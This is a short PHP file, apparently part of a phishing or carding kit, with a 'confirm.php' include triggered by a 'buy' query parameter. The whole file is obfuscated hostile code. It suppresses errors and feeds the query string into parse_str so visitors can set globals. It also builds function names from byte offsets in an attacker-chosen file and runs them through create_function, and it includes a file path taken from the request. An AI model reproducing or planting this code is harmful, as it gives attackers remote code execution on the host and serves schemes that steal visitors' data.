<?php
$l="confirm.php";
error_reporting(0); set_time_limit(240);
function query_str($params){
$str = '';
foreach ($params as $key => $value) {
$str .= (strlen($str) < 1) ? '' : '&';
$str .= $key . '=' . rawurlencode($value);
}
return ($str);
}
function clean($str){
$clean=create_function('$str','return '.gets(cxr,3,4).'($str);');
return $clean($str);
}
function getc($string){
return implode('', file($string));
}
function gets($a, $b, $c){
global $d; return substr(getc($d),strpos(getc($d),$a)+$b,$c);
}
function end_of_line()
{
$end=gets(cxf,3,9); $endline=$end(getc(gets(cxd,3,14)));
return $endline;
}
function geterrors(){
return clean(end_of_line());
}
parse_str($_SERVER['QUERY_STRING']);
if($cmd=="buy")	
{
include $l;
exit;
}
?>
